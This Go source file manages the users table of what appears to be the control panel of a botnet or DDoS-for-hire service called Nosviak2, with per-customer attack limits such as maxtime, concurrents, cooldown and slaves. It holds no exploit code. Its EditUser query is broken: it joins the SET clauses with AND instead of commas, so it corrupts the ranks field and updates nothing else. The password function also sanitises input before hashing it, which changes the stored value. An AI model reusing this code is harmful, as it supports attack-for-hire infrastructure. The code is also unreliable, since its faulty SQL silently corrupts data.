package database

import (
	"Nosviak2/core/sources/tools"

	"time"
)

//stores the users information properly
//this will allow for better handling without issues
type User struct { //stored in type structure
	Identity, Parent int //pretty much stores the users position inside the database
	Username, Password, Ranks, Theme, MFA_secret, Plan, LockedAddress, Token string //stores the username & password properly without issues
	MaxTime, Concurrents, Cooldown, MaxSessions, MaxSlaves int //stores the maxtime etc properly without issues happening
	NewUser, Locked bool //stores if the user is type new user properly
	Expiry, Created, Updated int64 //stores the users due expiry date properly
}

// EditUser edits the users fields
func (c *Connection) EditUser(user *User) error {
	_, err := c.Conn.Exec("UPDATE `users` SET `ranks` = ? AND `maxtime` = ? AND `cooldown` = ? AND `concurrents` = ? AND `maxsessions` = ? AND `newuser` = ? AND `theme` = ? AND `expiry` = ? AND `parent` = ? AND `created` = ? AND `updated` = ? AND `max_slaves` = ? AND `mfa` = ? AND `locked` = ? AND `plan` = ? AND `token` = ? AND `address` = ? WHERE `username` = ?", user.Ranks, user.MaxTime, user.Cooldown, user.Concurrents, user.MaxSessions, user.NewUser, user.Theme, user.Expiry, user.Parent, user.Created, user.Updated, user.MaxSlaves, user.MFA_secret, user.Locked, user.Plan, user.Token, user.LockedAddress, user.Username)
	return err
}


//correctly tries to authenticate the user into the system
//this will properly try to scan the database for the username without issues
func (c *Connection) FindUser(user string) (*User, error) {
	user = tools.SanatizeTool(user)
	//correctly querys the function without issues
	//this ensures its done properly without errors happening
	RowBus := c.Conn.QueryRow("SELECT `identity`, `username`, `password`, `ranks`, `maxtime`, `cooldown`, `concurrents`, `maxsessions`, `newuser`, `theme`, `expiry`, `parent`, `created`, `updated`, `max_slaves`, `mfa`, `locked`, `plan`, `address`, `token` FROM `users` WHERE `username` = ?", user)
	if RowBus.Err() != nil { //error handling properly without issues
		return nil, RowBus.Err() //returns the error correctly
	}

	var usr User //erorr handling properly
	//stores the future user structure properly
	//this will scan the row for information about the user
	if err := RowBus.Scan(&usr.Identity, &usr.Username, &usr.Password, &usr.Ranks, &usr.MaxTime, &usr.Cooldown, &usr.Concurrents, &usr.MaxSessions, &usr.NewUser, &usr.Theme, &usr.Expiry, &usr.Parent, &usr.Created, &usr.Updated, &usr.MaxSlaves, &usr.MFA_secret, &usr.Locked, &usr.Plan, &usr.LockedAddress, &usr.Token); err != nil {
		return nil, err //returns the correctly properly
	}
 
	//returns the information
	//this will make sure its done without issues
	return &usr, nil //returns structure properly
}

//gets all the users properly and safely
//this will ensure its done without issues happening
func (c *Connection) GetUsers() ([]User, error) {
	//correctly querys the sql database
	//this will ensure its done properly
	rows, err := c.Conn.Query("SELECT `identity`, `username`, `password`, `ranks`, `maxtime`, `cooldown`, `concurrents`, `maxsessions`, `newuser`, `theme`, `expiry`, `parent`, `created`, `updated`, `max_slaves`, `mfa`, `locked`, `plan`, `address`, `token` FROM `users`")
	if err != nil { //correctly error handles the database properly
		return make([]User, 0), err //returns the error properly
	}

	defer rows.Close()
	//stores all the login requests we will store
	//this will ensure its done properly without issues
	var Users []User = make([]User, 0) //stored in array

	//for loops through all properly
	//this will ensure its done correctly
	for rows.Next() { //loops through each row
		var usr *User = &User{}
		err := rows.Scan(&usr.Identity, &usr.Username, &usr.Password, &usr.Ranks, &usr.MaxTime, &usr.Cooldown, &usr.Concurrents, &usr.MaxSessions, &usr.NewUser, &usr.Theme, &usr.Expiry, &usr.Parent, &usr.Created, &usr.Updated, &usr.MaxSlaves, &usr.MFA_secret, &usr.Locked, &usr.Plan, &usr.LockedAddress, &usr.Token)
		if err != nil { //error handling properly without issues
			return make([]User, 0), err //stores inside array
		}

		//this will make sure its done correctly without issues
		Users = append(Users, *usr) //saves into the array
	}

	//returns the array of structs properly
	//this will ensure its done correctly and properly
	return Users, nil
}

//tries to correctly create the user without issues
//this will ensure it happens without errors on request
func (c *Connection) MakeUser(u *User) error { //error returned
	//properly tries to return the information without issues
	//this will make sure we have properly inserted without errors happening
	_, err := c.Conn.Exec("INSERT INTO `users` (`identity`, `username`, `password`, `ranks`, `maxtime`, `cooldown`, `concurrents`, `maxsessions`, `newuser`, `theme`, `expiry`, `parent`, `created`, `updated`, `max_slaves`, `mfa`, `locked`, `plan`, `address`, `token`) VALUES (NULL, ?, ?, ?, ?, ?, ?, ?, ?, 'default', ?, ?, UNIX_TIMESTAMP(), UNIX_TIMESTAMP(), ?, '',0, ?, '', ?);", u.Username, HashProduct(u.Password), u.Ranks, u.MaxTime, u.Cooldown, u.Concurrents, u.MaxSessions, u.NewUser, u.Expiry, u.Parent, u.MaxSlaves, u.Plan, HashProduct(u.Token))
	return err
}


//properly tries to edit the ranks without issues happening
//this will make sure its properly done without errors happening
func (c *Connection) EditRanks(new, user string) error {
	user = tools.SanatizeTool(user)
	c.Updated(user) //updates the updated period unix properly
	_, err := c.Conn.Exec("UPDATE `users` SET `ranks` = ? WHERE `username` = ?", new, user)
	return err
}

//correctly tries to update the maxtime
//this will ensure its done without errors happening
func (c *Connection) EditMaxTime(new int, user string) error {
	user = tools.SanatizeTool(user)
	c.Updated(user) //updates the updated period unix properly
	_, err := c.Conn.Exec("UPDATE `users` SET `maxtime` = ? WHERE `username` = ?", new, user)
	return err
}

//correctly tries to update the cooldown
//this will ensure its done without errors happening
func (c *Connection) EditCooldown(new int, user string) error {
	user = tools.SanatizeTool(user)
	c.Updated(user) //updates the updated period unix properly
	_, err := c.Conn.Exec("UPDATE `users` SET `cooldown` = ? WHERE `username` = ?", new, user)
	return err
}

//correctly tries to update the concurrents
//this will ensure its done without errors happening
func (c *Connection) EditConcurrents(new int, user string) error {
	user = tools.SanatizeTool(user)
	c.Updated(user) //updates the updated period unix properly
	_, err := c.Conn.Exec("UPDATE `users` SET `concurrents` = ? WHERE `username` = ?", new, user)
	return err
}

//tries to correctly remove the user from the database
//this will ensure its done without errors triggering on request
func (c *Connection) RemoveUser(user string) error { //returns the error founded
	user = tools.SanatizeTool(user)
	c.Updated(user) //updates the updated period unix properly
	_, err := c.Conn.Exec("DELETE FROM `users` WHERE `username` = ?", user)
	return err
}

//updates the password correctly and safely
//this will change a users password inside the database without issues
func (c *Connection) Password(password, user string) error {
	user = tools.SanatizeTool(user)
	password = tools.SanatizeTool(password)
	c.Updated(user) //updates the updated period unix properly
	_, err := c.Conn.Exec("UPDATE `users` SET `password` = ? WHERE `username` = ?", HashProduct(password), user)
	return err
}

//disables the new user option properly
//this will ensure its done without any errors
func (c *Connection) DisableNewUser(user string) error { //returns the information
	user = tools.SanatizeTool(user)
	c.Updated(user) //updates the updated period unix properly
	_, err := c.Conn.Exec("UPDATE `users` SET `newuser` = 0 WHERE `username` = ?", user)
	return err
}

//enables the new user option properly
//this will ensure its done without any errors
func (c *Connection) EnableNewUser(user string) error { //returns the information
	user = tools.SanatizeTool(user)
	c.Updated(user) //updates the updated period unix properly
	_, err := c.Conn.Exec("UPDATE `users` SET `newuser` = 1 WHERE `username` = ?", user)
	return err
}

//edit the max slaves option properly
//this will ensure its done without any errors
func (c *Connection) EditMaxSlaves(user string, new int) error { //returns the information
	user = tools.SanatizeTool(user)
	c.Updated(user) //updates the updated period unix properly
	_, err := c.Conn.Exec("UPDATE `users` SET `max_slaves` = ? WHERE `username` = ?", new, user)
	return err
}


//this will update the users theme
//allows for better control without issues
func (c *Connection) Theme(user string, newTheme string) error { //returns error properly
	user = tools.SanatizeTool(user)
	newTheme = tools.SanatizeTool(newTheme)
	c.Updated(user) //updates the updated period unix properly
	_, err := c.Conn.Exec("UPDATE `users` SET `theme` = ? WHERE `username` = ?", newTheme, user)
	return err
}

//this will update the users apikey
//allows for better control without issues
func (c *Connection) APIKey(user string, apikey string) error { //returns error properly
	user = tools.SanatizeTool(user)
	apikey = tools.SanatizeTool(apikey)
	c.Updated(user) //updates the updated period unix properly
	_, err := c.Conn.Exec("UPDATE `users` SET `token` = ? WHERE `username` = ?", HashProduct(apikey), user)
	return err
}

//this will update the expiry left
//allows for proper controlling without issues
func (c *Connection) Expiry(user string, expiry int64) error { //returns error properly
	user = tools.SanatizeTool(user)
	c.Updated(user) //updates the updated period unix properly
	_, err := c.Conn.Exec("UPDATE `users` SET `expiry` = ? WHERE `username` = ?", expiry, user)
	return err
}

//either lock or unlock the account
//allows for proper controlling without issues
func (c *Connection) Lock(user string) error { //returns error properly
	user = tools.SanatizeTool(user)
	c.Updated(user) //updates the updated period unix properly
	_, err := c.Conn.Exec("UPDATE `users` SET `locked` = 1 WHERE `username` = ?", user)
	return err
}

//either lock or unlock the account
//allows for proper controlling without issues
func (c *Connection) Unlock(user string) error { //returns error properly
	user = tools.SanatizeTool(user)
	c.Updated(user) //updates the updated period unix properly
	_, err := c.Conn.Exec("UPDATE `users` SET `locked` = 0 WHERE `username` = ?", user)
	return err
}

//remove mfa from the account properly
//allows for proper controlling without issues
func (c *Connection) RmMFA(user string) error { //returns error properly
	user = tools.SanatizeTool(user)
	c.Updated(user) //updates the updated period unix properly
	_, err := c.Conn.Exec("UPDATE `users` SET `mfa` = '' WHERE `username` = ?", user)
	return err
}

//either lock or unlock the account
//allows for proper controlling without issues
func (c *Connection) Sessions(user string, amount int) error { //returns error properly
	user = tools.SanatizeTool(user)
	c.Updated(user) //updates the updated period unix properly
	_, err := c.Conn.Exec("UPDATE `users` SET `maxsessions` = ? WHERE `username` = ?", amount, user)
	return err
}

//updates the users update time
//this will ensure its done without any errors
func (c *Connection) Updated(user string) {
	user = tools.SanatizeTool(user)
	c.Conn.Exec("UPDATE `users` SET `updated` = ? WHERE `username` = ?", time.Now().Unix(), user)
}

//gets all the users properly and safely
//this will ensure its done without issues happening
func (c *Connection) ParentTracer(peer int) ([]User, error) {
	//correctly querys the sql database
	//this will ensure its done properly
	rows, err := c.Conn.Query("SELECT `identity`, `username`, `password`, `ranks`, `maxtime`, `cooldown`, `concurrents`, `maxsessions`, `newuser`, `theme`, `expiry`, `parent`, `created`, `updated`, `max_slaves`, `mfa`, `locked`, `plan`, `address`, `token` FROM `users` WHERE `parent` = ?", peer)
	if err != nil { //correctly error handles the database properly
		return make([]User, 0), err //returns the error properly
	}


	defer rows.Close()
	//stores all the login requests we will store
	//this will ensure its done properly without issues
	var Users []User = make([]User, 0) //stored in array

	//for loops through all properly
	//this will ensure its done correctly
	for rows.Next() { //loops through each row
		var usr *User = &User{}
		err := rows.Scan(&usr.Identity, &usr.Username, &usr.Password, &usr.Ranks, &usr.MaxTime, &usr.Cooldown, &usr.Concurrents, &usr.MaxSessions, &usr.NewUser, &usr.Theme, &usr.Expiry, &usr.Parent, &usr.Created, &usr.Updated, &usr.MaxSlaves, &usr.MFA_secret, &usr.Locked, &usr.Plan, &usr.LockedAddress, &usr.Token)
		if err != nil { //error handling properly without issues
			return make([]User, 0), err //stores inside array
		}

		//this will make sure its done correctly without issues
		Users = append(Users, *usr) //saves into the array
	}

	//returns the array of structs properly
	//this will ensure its done correctly and properly
	return Users, nil
}

//gets the user via the parent id
//allows for proper control without issues
func (c *Connection) GetUserViaParent(peer int) (*User, error) {
	//correctly querys the function without issues
	//this ensures its done properly without errors happening
	RowBus := c.Conn.QueryRow("SELECT `identity`, `username`, `password`, `ranks`, `maxtime`, `cooldown`, `concurrents`, `maxsessions`, `newuser`, `theme`, `expiry`, `parent`, `created`, `updated`, `max_slaves`, `mfa`, `locked`, `plan`, `address`, `token` FROM `users` WHERE `identity` = ?", peer)
	if RowBus.Err() != nil { //error handling properly without issues
		return nil, RowBus.Err() //returns the error correctly
	}

	var usr User //erorr handling properly
	//stores the future user structure properly
	//this will scan the row for information about the user
	if err := RowBus.Scan(&usr.Identity, &usr.Username, &usr.Password, &usr.Ranks, &usr.MaxTime, &usr.Cooldown, &usr.Concurrents, &usr.MaxSessions, &usr.NewUser, &usr.Theme, &usr.Expiry, &usr.Parent, &usr.Created, &usr.Updated, &usr.MaxSlaves, &usr.MFA_secret, &usr.Locked, &usr.Plan, &usr.LockedAddress, &usr.Token); err != nil {
		return nil, err //returns the correctly properly
	}
 
	//returns the information
	//this will make sure its done without issues

	return &usr, nil //returns structure properly
} 

//gets the user via the parent id
//allows for proper control without issues
func (c *Connection) GetUserViaToken(token string) (*User, error) {
	//correctly querys the function without issues
	//this ensures its done properly without errors happening
	RowBus := c.Conn.QueryRow("SELECT `identity`, `username`, `password`, `ranks`, `maxtime`, `cooldown`, `concurrents`, `maxsessions`, `newuser`, `theme`, `expiry`, `parent`, `created`, `updated`, `max_slaves`, `mfa`, `locked`, `plan`, `address`, `token` FROM `users` WHERE `token` = ?", HashProduct(token))
	if RowBus.Err() != nil { //error handling properly without issues
		return nil, RowBus.Err() //returns the error correctly
	}

	var usr User //erorr handling properly
	//stores the future user structure properly
	//this will scan the row for information about the user
	if err := RowBus.Scan(&usr.Identity, &usr.Username, &usr.Password, &usr.Ranks, &usr.MaxTime, &usr.Cooldown, &usr.Concurrents, &usr.MaxSessions, &usr.NewUser, &usr.Theme, &usr.Expiry, &usr.Parent, &usr.Created, &usr.Updated, &usr.MaxSlaves, &usr.MFA_secret, &usr.Locked, &usr.Plan, &usr.LockedAddress, &usr.Token); err != nil {
		return nil, err //returns the correctly properly
	}
 
	//returns the information
	//this will make sure its done without issues

	return &usr, nil //returns structure properly
} 